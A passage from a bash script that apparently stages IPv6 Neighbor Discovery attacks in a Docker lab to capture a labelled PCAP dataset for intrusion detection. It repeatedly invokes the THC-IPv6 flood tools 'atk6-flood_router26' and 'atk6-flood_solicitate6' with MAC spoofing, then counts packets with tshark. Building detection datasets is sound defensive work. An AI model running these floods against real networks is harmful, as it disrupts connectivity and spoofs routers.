  "atk6-flood_solicitate6 eth1" "variable-rate NS flood"
restore_attacker_mac
burst_ndp_reconvergence
phase_sleep "${RECOVERY2_SECS}" "recovery_2" "Normal" "post ND1 recovery"

# ── RA Slow Attack 1 ─────────────────────────────────────────────────────────
spoof_attacker_mac
run_attack_slow "${RA_SLOW1_SECS}" "ra_slow_1" "RA_Attack" \
  "low-and-slow RA 1-per-4-9s"
restore_attacker_mac
burst_ndp_reconvergence
phase_sleep "${RECOVERY3_SECS}" "recovery_3" "Normal" "post RA-slow1 recovery"

# ── RA Attack 2 ──────────────────────────────────────────────────────────────
spoof_attacker_mac
amplify_victim_traffic
run_attack_variable "${RA_ATTACK2_SECS}" "ra_attack_2" "RA_Attack" \
  "atk6-flood_router26 eth1" "second variable-rate RA flood"
restore_attacker_mac
burst_ndp_reconvergence
phase_sleep "${RECOVERY4_SECS}" "recovery_4" "Normal" "post RA2 recovery"

# ── ND Attack 2 ──────────────────────────────────────────────────────────────
spoof_attacker_mac
amplify_victim_traffic
run_attack_variable "${ND_ATTACK2_SECS}" "nd_attack_2" "ND_Attack" \
  "atk6-flood_solicitate6 eth1" "second variable-rate NS flood"
restore_attacker_mac
burst_ndp_reconvergence
phase_sleep "${RECOVERY5_SECS}" "recovery_5" "Normal" "post ND2 recovery"

# ── RA Attack 4 ──────────────────────────────────────────────────────────────
spoof_attacker_mac
amplify_victim_traffic
run_attack_variable "${RA_ATTACK4_SECS}" "ra_attack_4" "RA_Attack" \
  "atk6-flood_router26 eth1" "fourth variable-rate RA flood"
restore_attacker_mac
burst_ndp_reconvergence
phase_sleep "${RECOVERY7_SECS}" "recovery_7" "Normal" "post RA4 recovery"

# ── ND Attack 3 ──────────────────────────────────────────────────────────────
spoof_attacker_mac
amplify_victim_traffic
run_attack_variable "${ND_ATTACK3_SECS}" "nd_attack_3" "ND_Attack" \
  "atk6-flood_solicitate6 eth1" "third variable-rate NS flood"
restore_attacker_mac
burst_ndp_reconvergence
phase_sleep "${RECOVERY8_SECS}" "recovery_8" "Normal" "post ND3 recovery"

# ── ND Slow Attack 1 — VOL-9 new phase ──────────────────────────────────────
spoof_attacker_mac
run_nd_attack_slow "${ND_SLOW1_SECS}" "nd_slow_1" "ND_Attack" \
  "low-and-slow ND 1-per-4-9s VOL-9"
restore_attacker_mac
burst_ndp_reconvergence
phase_sleep "${RECOVERY9_SECS}" "recovery_9" "Normal" "post ND-slow1 recovery"

# ── RA Attack 5 — VOL-9 new phase ───────────────────────────────────────────
spoof_attacker_mac
amplify_victim_traffic
run_attack_variable "${RA_ATTACK5_SECS}" "ra_attack_5" "RA_Attack" \
  "atk6-flood_router26 eth1" "fifth variable-rate RA flood VOL-9"
restore_attacker_mac
burst_ndp_reconvergence
phase_sleep "${RECOVERY10_SECS}" "recovery_10" "Normal" "post RA5 recovery"

# ── Combined RA+ND Attack ────────────────────────────────────────────────────
spoof_attacker_mac
amplify_victim_traffic
run_combined_attack "${COMBINED_SECS}" "combined_attack" "Combined_Attack" \
  "simultaneous RA+ND variable flood VOL-9"
restore_attacker_mac
burst_ndp_reconvergence
phase_sleep "${RECOVERY6_SECS}" "recovery_6" "Normal" "short recovery before ra_attack_3"

# ── RA Attack 3 (straddles 80% cut) ──────────────────────────────────────────
spoof_attacker_mac
amplify_victim_traffic
run_attack_variable "${RA_ATTACK3_SECS}" "ra_attack_3" "RA_Attack" \
  "atk6-flood_router26 eth1" "third RA straddles 80pct boundary"
restore_attacker_mac
burst_ndp_reconvergence

# ── RA Slow Attack 2 ─────────────────────────────────────────────────────────
spoof_attacker_mac
run_attack_slow "${RA_SLOW2_SECS}" "ra_slow_2" "RA_Attack" \
  "second low-and-slow RA in test region"
restore_attacker_mac
burst_ndp_reconvergence

# ── ND Attack 4 — VOL-9 new phase ───────────────────────────────────────────
spoof_attacker_mac
amplify_victim_traffic
run_attack_variable "${ND_ATTACK4_SECS}" "nd_attack_4" "ND_Attack" \
  "atk6-flood_solicitate6 eth1" "fourth variable-rate NS flood VOL-9"
restore_attacker_mac
burst_ndp_reconvergence
phase_sleep "${RECOVERY11_SECS}" "recovery_11" "Normal" "post ND4 recovery"

# ── Final Normal ──────────────────────────────────────────────────────────────
phase_sleep "${FINAL_NORMAL_SECS}" "baseline_final" "Normal" "final clean normal period"

# =============================================================================
# STEP 7 — Copy PCAP to host
# =============================================================================

record_event "capture_stop" "teardown" "N/A" "capture stopping"
stop_capture

log "Step 7 - Copying pcap to host ..."
sudo docker cp "${SWITCH}:${PCAP_CONTAINER}" "${PCAP_HOST}"

cp "${PCAP_HOST}"  "${DATASET_ROOT}/raw_capture.pcap"
cp "${EVENTS_CSV}" "${DATASET_ROOT}/raw_capture_events.csv"
cp "${NODES_CSV}"  "${DATASET_ROOT}/raw_capture_nodes.csv"
ln -sfn "run_${RUN_ID}" "${DATASET_ROOT}/latest"

record_event "run_end" "teardown" "N/A" "dataset run completed"

# =============================================================================
# SUMMARY
# =============================================================================

echo
echo "=========================================================="
echo "Capture complete — v4"
echo "=========================================================="
echo "  Run directory  : ${OUTDIR}"
echo "  PCAP           : ${PCAP_HOST}"
echo "  Events CSV     : ${EVENTS_CSV}"
echo "  Nodes CSV      : ${NODES_CSV}"
echo "  Router MAC     : ${ROUTER_MAC}"
echo "  Attacker MAC   : ${ATTACKER_REAL_MAC}"
echo
echo "  Phase timing:"
echo "    Total duration      : ${PHASE_TOTAL}s (~$(( PHASE_TOTAL / 60 )) min)"
echo "    Attack total        : ${ATTACK_TOTAL}s"
echo "    Normal total        : ${NORMAL_TOTAL}s"
echo "    80% split boundary  : ${SPLIT_80_S}s"
echo "    combined_attack     : ${COMBINED_START}s → ${COMBINED_END}s"
echo "    ra_attack_3         : ${RA3_START}s → ${RA3_END}s"
echo
echo "  v4 changes (vs v3):"
echo "    VOL-8   Phase durations ~2.7× (${PHASE_TOTAL}s vs 1020s)"
echo "    VOL-9   New: nd_slow_1, ra_attack_5, nd_attack_4"
echo "    VOL-10  Longer baselines/recoveries"
echo "    VOL-11  tcpdump ring buffer 16384 KB"
echo
echo "  Python script — recommended constants:"
echo "    TEMPORAL_SPLIT_RATIO = 0.65"
echo "    TEST_SIZE            = 0.20"
echo "    SWEEP_K_VALUES       = [5, 10, 15, 20]"
echo

# =============================================================================
# Packet counting
# =============================================================================

if command -v tshark >/dev/null 2>&1; then
  log "Counting packets ..."

  TSHARK_TMP="$(mktemp /tmp/tshark_fields.XXXXXX)"

  tshark -r "${PCAP_HOST}" \
    -T fields \
    -e icmpv6.type \
    -e eth.src \
    -E separator=' ' \
    2>/dev/null > "${TSHARK_TMP}"

  count_type() {
    awk -v t="$1" '$1 == t { c++ } END { print c+0 }' "${TSHARK_TMP}"
  }
  count_type_src() {
    awk -v t="$1" -v s="$2" '$1 == t && $2 == s { c++ } END { print c+0 }' "${TSHARK_TMP}"
  }
  count_type_or() {
    awk -v t1="$1" -v t2="$2" '$1 == t1 || $1 == t2 { c++ } END { print c+0 }' "${TSHARK_TMP}"
  }

  RS=$(count_type 133)
  RA=$(count_type 134)
  RA_BENIGN=$(count_type_src 134 "${ROUTER_MAC}")
  RA_ATTACK_REAL=$(count_type_src 134 "${ATTACKER_REAL_MAC}")
  NS=$(count_type 135)
  NS_ATTACK_REAL=$(count_type_src 135 "${ATTACKER_REAL_MAC}")
  NA=$(count_type 136)
  ECHO=$(count_type_or 128 129)

  rm -f "${TSHARK_TMP}"

  echo "  Packet counts:"
  echo "    RS  (133): ${RS}"
  echo "    RA  (134): ${RA}  (benign: ${RA_BENIGN}, real-atk-MAC: ${RA_ATTACK_REAL})"
  echo "    NS  (135): ${NS}  (real-atk-MAC: ${NS_ATTACK_REAL})"
  echo "    NA  (136): ${NA}"
  echo "    Echo:      ${ECHO}"
  echo
  PCAP_MB=$(du -m "${PCAP_HOST}" | cut -f1)
  echo "  PCAP size: ${PCAP_MB} MB  (target: 400–600 MB)"
else
  echo "  tshark not found — skipping packet counters."
fi

echo
echo "Dataset capture is ready."
